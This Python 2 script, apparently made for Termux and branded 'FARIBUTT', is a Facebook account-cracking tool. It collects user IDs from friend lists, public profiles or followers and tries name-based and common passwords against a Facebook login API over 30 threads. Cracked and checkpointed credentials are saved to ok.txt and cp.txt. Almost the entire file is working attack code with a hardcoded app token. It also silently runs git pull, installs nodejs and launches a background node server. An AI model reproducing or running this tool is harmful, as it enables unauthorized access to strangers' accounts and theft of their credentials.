#coding=utf-8
 
#!/usr/bin/python2
 
try:
 
    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
 
    from multiprocessing.pool import ThreadPool
 
except ImportError:
 
    os.system("pip2 install requests")
 
    os.system("python2 your-name.py")
    
os.system("clear")
 
 
 
if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
 
    os.system("apt update && apt install nodejs -y")
 
from requests.exceptions import ConnectionError
 
os.system("git pull")
 
if not os.path.isfile("/data/data/com.termux/files/home/jjjjj/public/node_modules/bytes/index.js"):
 
    os.system("fuser -k 5000/tcp &")
 
    os.system("cd jjjjj && pip install progress")
 
    os.system("cd jjjjj && npm install")
 
    os.system("cd jjjjj && node index.js &")
 
    os.system("clear")
 
    time.sleep(10)
 
elif os.path.isfile("/data/data/com.termux/files/home/jjjjj/public/node_modules/bytes/index.js"):
 
    os.system("fuser -k 5000/tcp &")
 
    os.system("#")
 
    os.system("cd jjjjj && node index.js &")
 
    os.system("clear")
 
bd=random.randint(2e7, 3e7)
 
sim=random.randint(2e4, 4e4)
 
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
 
reload(sys)
 
sys.setdefaultencoding("utf-8")
 
c = "\033[1;92m"
 
c2 = "\033[0;97m"
 
c3 = "\033[1;91m"
 
logo = """                                 
                                                                                                                                                                          
                                                                                                                                                                        
FFFFFFFFFFFFFFFFFFFFFF      AAA               RRRRRRRRRRRRRRRRR   IIIIIIIIII     BBBBBBBBBBBBBBBBB   UUUUUUUU     UUUUUUUUTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
F::::::::::::::::::::F     A:::A              R::::::::::::::::R  I::::::::I     B::::::::::::::::B  U::::::U     U::::::UT:::::::::::::::::::::TT:::::::::::::::::::::T
F::::::::::::::::::::F    A:::::A             R::::::RRRRRR:::::R I::::::::I     B::::::BBBBBB:::::B U::::::U     U::::::UT:::::::::::::::::::::TT:::::::::::::::::::::T
FF::::::FFFFFFFFF::::F   A:::::::A            RR:::::R     R:::::RII::::::II     BB:::::B     B:::::BUU:::::U     U:::::UUT:::::TT:::::::TT:::::TT:::::TT:::::::TT:::::T
  F:::::F       FFFFFF  A:::::::::A             R::::R     R:::::R  I::::I         B::::B     B:::::B U:::::U     U:::::U TTTTTT  T:::::T  TTTTTTTTTTTT  T:::::T  TTTTTT
  F:::::F              A:::::A:::::A            R::::R     R:::::R  I::::I         B::::B     B:::::B U:::::D     D:::::U         T:::::T                T:::::T        
  F::::::FFFFFFFFFF   A:::::A A:::::A           R::::RRRRRR:::::R   I::::I         B::::BBBBBB:::::B  U:::::D     D:::::U         T:::::T                T:::::T        
  F:::::::::::::::F  A:::::A   A:::::A          R:::::::::::::RR    I::::I         B:::::::::::::BB   U:::::D     D:::::U         T:::::T                T:::::T        
  F:::::::::::::::F A:::::A     A:::::A         R::::RRRRRR:::::R   I::::I         B::::BBBBBB:::::B  U:::::D     D:::::U         T:::::T                T:::::T        
  F::::::FFFFFFFFFFA:::::AAAAAAAAA:::::A        R::::R     R:::::R  I::::I         B::::B     B:::::B U:::::D     D:::::U         T:::::T                T:::::T        
  F:::::F         A:::::::::::::::::::::A       R::::R     R:::::R  I::::I         B::::B     B:::::B U:::::D     D:::::U         T:::::T                T:::::T        
  F:::::F        A:::::AAAAAAAAAAAAA:::::A      R::::R     R:::::R  I::::I         B::::B     B:::::B U::::::U   U::::::U         T:::::T                T:::::T        
FF:::::::FF     A:::::A             A:::::A   RR:::::R     R:::::RII::::::II     BB:::::BBBBBB::::::B U:::::::UUU:::::::U       TT:::::::TT            TT:::::::TT      
F::::::::FF    A:::::A               A:::::A  R::::::R     R:::::RI::::::::I     B:::::::::::::::::B   UU:::::::::::::UU        T:::::::::T            T:::::::::T      
F::::::::FF   A:::::A                 A:::::A R::::::R     R:::::RI::::::::I     B::::::::::::::::B      UU:::::::::UU          T:::::::::T            T:::::::::T      
FFFFFFFFFFF  AAAAAAA                   AAAAAAARRRRRRRR     RRRRRRRIIIIIIIIII     BBBBBBBBBBBBBBBBB         UUUUUUUUU            TTTTTTTTTTT            TTTTTTTTTTT      
                                                                                                                                                                        
                                                                                                                                                                        
                                                                                                                                                                        
                                                                                                                                                                                                                                                                             

 
def main():
 
    os.system("clear")
 
    print logo
 
    print("")
 
    print("\033[0;95m  [ CLONING START ]").center(50)
 
    print("")
 
    print("\033[1;93m[1]\033[1;92mSTART CLONiNG....")
 
    print("")
 
    print("\033[1;91m[0]\033[1;97mEXIT ")
 
    print("")
 
    main_select()
 
def main_select():
 
    Mz = raw_input("\033[1;97mChoose Opition \033[1;31m==>\033[0;92m •••\033[1;96m ")
 
    if Mz  =="1":
 
        login()
 
    if Mz =="2":
 
        os.system("xdg-open https://www.facebook.com/FARIBUTT0009 ")
 
	main()  
 
    elif Mz =="0":
 
        os.system("exit")
 
    else:
 
        print("[!] Please select a valid option").center(50)
 
        time.sleep(2)
 
        main()
 
def login():
 
    os.system("clear")
 
    print logo
 
    print("")
 
    print("\033[0;92m[ Login Menu ]").center(50)
 
    print("")
 
    print("\033[1;97m[1]\033[1;96mLogin Using Token")
 
    print("")
 
    print("\033[1;97m[3]\033[1;91mBack")
 
    print("")
 
    login_select()
 
def login_select():
 
    Mz = raw_input(" \033[1;97m Choose Option :\033[1;96m ")
 
    if Mz =="1":
 
        os.system("clear")
 
        print logo
 
        print("")
 
	print("\033[1;93m[ login with token ]").center(50)
 
	print("")
 
        token = raw_input("[!] Token \033[0;91m==> \033[0;92m• • • \033[0;90m")
 
        token_s = open(".fb_token.txt","w")
 
        token_s.write(token)
 
        token_s.close()
 
        try:
 
            r = requests.get("https://graph.facebook.com/me?access_token="+token)
 
            q = json.loads(r.text)
 
            name = q["name"]
 
            nm = name.rsplit(" ")[0]
 
            print("")
 
            print("\033[1;92mYour token login successfully").center(50)
 
            time.sleep(1)
 
	    os.system("xdg-open https://www.facebook.com/FARIBUTT0009")
	
 
	    time.sleep(1)
 
            menu()
 
        except (KeyError , IOError):
 
            print("")
 
            print("\033[1;91mToken invalid or account has checkpoint\033[0;97m").center(50)
 
            print("")
 
            time.sleep(2)
 
            login()
 
    elif Mz =="2":
 
        os.system("xdg-open https://www.facebook.com/FARIBUTT0009")
 
    elif Mz =="3":
 
        main()
 
    else:
 
        print("")
 
        print("\033[1;95mSelect a valid option").center(50)
 
        print("")
 
        login_select()
 
 
 
 
def menu():
 
    global token
 
    os.system("clear")
 
    print logo
 
    try:
 
        token = open(".fb_token.txt","r").read()
 
    except (KeyError , IOError):
 
        login()
 
    try:
 
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
 
        q = json.loads(r.text)
 
        nm = q["name"]
 
        nmf = nm.rsplit(" ")[0]
 
        ok = nmf
 
    except (KeyError , IOError):
 
        print("")
 
        print("login account has checkpoint").center(50)
 
        print("")
 
        os.system("rm -rf .fb_token.txt")
 
        time.sleep(1)
 
        login()
 
    except requests.exceptions.ConnectionError:
 
        print logo
 
        print("")
 
        print("Your internet connection failed").center(50)
 
        print("")
 
        time.sleep(2)
 
        menu()
 
    os.system("clear")
 
    print logo
 
    print("")
 
    print("\t\033[1;92mActive Token.... : " +nm)
 
    print("")
 
    print("\033[1;97m[1]\033[1;92mCrack From Friendlist")
 
    print("")
 
    print("\033[1;97m[2]\033[1;93mCrack From Public id")
 
    print("")
 
    print("\033[1;97m[3]\033[1;95mCrack From Followers id")
 
    print("")
 
    print("\033[1;97m[0]\033[1;96mEXIT ")
 
    print("")
 
    menu_select()
 
def menu_select():
 
	select = raw_input("\033[1;95m Choose Option\033[1;31m------> \033[1;32m• • •\033[0;97m")
 
	id=[]
 
	oks=[]
 
	cps=[]
 
	if select=="1":
 
		os.system("clear")
 
		print logo
 
		print("")
 
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
 
		z = json.loads(r.text)
 
		for s in z["data"]:
 
			uid=s['id']
 
			na=s['name']
 
			nm=na.rsplit(" ")[0]
 
			id.append(uid+'='+nm)
 
	if select =="2":
 
		os.system("clear")
 
		print(logo)
 
		print("")
 
		idt = raw_input("\033[1;92m[#] Put ID Link :\033[1;96m ")
 
		os.system("clear")
 
		print logo
 
		try:
 
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 
			q = json.loads(r.text)
 
			print("[!] \033[1;95mTarget ID : "+q["name"])
 
		except (KeyError , IOError):
 
		    print("")
 
		    print("\033[1;93myour login account has checkpoint").center(50)
 
		    print("")
 
		    menu()
 
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
 
		z = json.loads(r.text)
 
		for i in z["data"]:
 
			uid=i['id']
 
			na=i['name']
 
			nm=na.rsplit(" ")[0]
 
			id.append(uid+'='+nm)
 
	elif select =="3":
 
		os.system("clear")
 
		print logo
 
		print("")
 
		idt = raw_input("\033[1;92m[#] Put ID Link :\033[1;96m ")
 
		os.system("clear")
 
		print logo
 
		try:
 
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
 
			q = json.loads(r.text)
 
			print(" Target from  : "+q["name"])
 
		except (KeyError , IOError):
 
		    print("")
 
		    print("\033[1;91m login id has checkpoint").center(50)
 
		    print("")
 
		    time.sleep(3)
 
		    menu()
 
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
 
		z = json.loads(r.text)
 
		for i in z["data"]:
 
			uid=i['id']
 
			na=i['name']
 
			nm=na.rsplit(" ")[0]
 
			id.append(uid+'='+nm)
 
	elif select =="0":
 
	    os.system("exit")
 
	else:
 
	    print("")
 
	    print("\033[1;93mPlease Select A Valid Option").center(50)
 
	    time.sleep(2)
 
	    menu_select()
 
	print("\033[1;92m[#] Total IDs..... : "+str(len(id)))
 
	time.sleep(0.5)
 
	print("\033[1;96m[#] Please Wait A 5 minute.....")
 
	print 47*("-")
 
	print('')
 
	
 
	def main(arg):
 
		user=arg
 
		uid,name=user.split("=")
 
		try:
 
		    pass1=name+"123"
 
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		    d=json.loads(q)
 
		    if 'www.facebook.com' in d['error_msg']:
 
		        print("\033[1;31m==>\033[0;97mFARIBUTTCP "+uid+" \033[0;92m● "+pass1)
 
		        cp=open("\033[1;31m==>\033[0;97mcp.txt","a")
 
		        cp.write(uid+" = "+pass1+"\n")
 
		        cp.close()
 
		        cps.append(uid)
 
		    else:
 
		    	if "access_token" in d:
 
		            print("\033[1;31m==>\033[1;92mFARIBUTTOK "+uid+" \033[0;95m♡ "+pass1+"\x1b[1;0m")
 
		            ok=open("\033[1;32m==> \033[0;97mok.txt","a")
 
		            ok.write(uid+" = "+pass1+"\n")
 
		            ok.close()
 
		            oks.append(uid)
 
		        else:
 
		            pass2=name+"1234"
 
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		            d=json.loads(q)
 
		            if 'www.facebook.com' in d['error_msg']:
 
		                print("\033[1;32m==>\033[0;97mFARIBUTTCP "+uid+" \033[0;92m● "+pass2)
 
		                cp=open("\033[1;33m==> \033[0;97mcp.txt","a")
 
		                cp.write(uid+" = "+pass2+"\n")
 
		                cp.close()
 
		                cps.append(uid)
 
		            else:
 
		                if 'access_token' in d:
 
		                    print("\033[1;31m==>\033[1;92mFARIBUTTOK "+uid+" \033[0;95m♡ "+pass2+"\x1b[1;0m")
 
		                    ok=open("\033[1;34m==> \033[0;97mok.txt","a")
 
		                    ok.write(uid+" = "+pass2+"\n")
 
		                    ok.close()
 
		                    oks.append(uid)
 
		                else:
 
		                    pass3=name+"12345"
 
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		                    d=json.loads(q)
 
		                    if 'www.facebook.com' in d['error_msg']:
 
		                        print("\033[1;33m==>\033[0;97mFARIBUTT CP "+uid+" \033[0;92m● "+pass3)
 
		                        cp=open("\033[1;35m==> \033[0;97mcp.txt","a")
 
		                        cp.write(uid+" = "+pass3+"\n")
 
		                        cp.close()
 
		                        cps.append(uid)
 
		                    else:
 
		                        if 'access_token' in d:
 
		                            print("\033[1;31m==>\033[1;92mFARIBUTTOK "+uid+" \033[0;95m♡ "+pass3+"\x1b[1;0m")
 
		                            ok=open("\033[1;31m==> \033[0;97mok.txt","a")
 
		                            ok.write(uid+" = "+pass3+"\n")
 
		                            ok.close()
 
		                            oks.append(uid)
 
		                        else:
 
		                            pass4=name+"786"
 
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		                            d=json.loads(q)
 
		                            if 'www.facebook.com' in d['error_msg']:
 
		                                print("\033[1;34m==>\033[0;97mFARIBUTTCP "+uid+" \033[0;92m● "+pass4)
 
		                                cp=open("\033[1;31m==> \033[0;97mcp.txt","a")
 
		                                cp.write(uid+" = "+pass4+"\n")
 
		                                cp.close()
 
		                                cps.append(uid)
 
		                            else:
 
		                                if 'access_token' in d:
 
		                                    print("\033[1;31m==>\033[1;92mFARIBUTTOK "+uid+" \033[0;95m♡ "+pass4+"\x1b[1;0m")
 
		                                    ok=open("\033[1;31m==> \033[0;97mok.txt","a")
 
		                                    ok.write(uid+" = "+pass4+"\n")
 
		                                    ok.close()
 
		                                    oks.append(uid)
 
		                                else:
 
		                                    pass5="111222"
 
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		                                    d=json.loads(q)
 
		                                    if 'www.facebook.com' in d['error_msg']:
 
		                                        print("\033[1;35m==>\033[0;97mFARIBUTTCP "+uid+" \033[0;92m● "+pass5)
 
		                                        cp=open("\033[1;31m==> \033[0;97mcp.txt","a")
 
		                                        cp.write(uid+" = "+pass5+"\n")
 
		                                        cp.close()
 
		                                        cps.append(uid)
 
		                                    else:
 
		                                        if 'access_token' in d:
 
		                                            print("\033[1;31m==>\033[1;92mFARIBUTTOK "+uid+" \033[0;95m♡ "+pass5+"\x1b[1;0m")
 
		                                            ok=open("\033[1;31m==> \033[0;97mok.txt","a")
 
		                                            ok.write(uid+" = "+pass5+"\n")
 
		                                            ok.close()
 
		                                            oks.append(uid)
 
		                                        else:
 
		                                            pass6="786786786"
 
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		                                            d=json.loads(q)
 
		                                            if 'www.facebook.com' in d['error_msg']:
 
		                                                print("\033[1;36m==>\033[0;97mFARIBUTTCP "+uid+" \033[0;92m● "+pass6)
 
		                                                cp=open("\033[1;31m==> \033[0;97mcp.txt","a")
 
		                                                cp.write(uid+" = "+pass6+"\n")
 
		                                                cp.close()
 
		                                                cps.append(uid)
 
		                                            else:
 
		                                                if 'access_token' in d:
 
		                                                    print("\033[1;31m==>\033[1;92mFARIBUTTOK "+uid+" \033[0;95m♡ "+pass6+"\x1b[1;0m")
 
		                                                    ok=open("\033[1;31m==> \033[0;97mok.txt","a")
 
		                                                    ok.write(uid+" = "+pass6+"\n")
 
		                                                    ok.close()
 
		                                                    oks.append(uid)
 
		                                                else:
 
		                                                    pass7="1234567"
 
		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		                                                    d=json.loads(q)
 
		                                                    if 'www.facebook.com' in d['error_msg']:
 
		                                                        print("\033[1;37m==>\033[0;97mFARIBUTTCP "+uid+" \033[0;92m● "+pass7)
 
		                                                        cp=open("\033[1;31m==> \033[0;97mcp.txt","a")
 
		                                                        cp.write(uid+" = "+pass7+"\n")
 
		                                                        cp.close()
 
		                                                        cps.append(uid)
 
		                                                     
									
 
															
 
		except:
 
			pass
 
		
 
	p = ThreadPool(30)
 
	p.map(main, id)
 
	print (" ")
 
	print (47*"-")
 
	print ("[!] Process has completed")
 
	print ("[!] (' \033[1;31m=====>\033[0;97m') Total Cp/Ok : "+str(len(cps)) + "/"+str(len(oks)))
 
	print (47*"-")
 
	raw_input("\t\x1b[0;92m (' \033[1;31m====>\033[0;97m')Press enter to main menu back")
 
	menu()
 
	
 
if __name__ == '__main__':
 
    main()
 

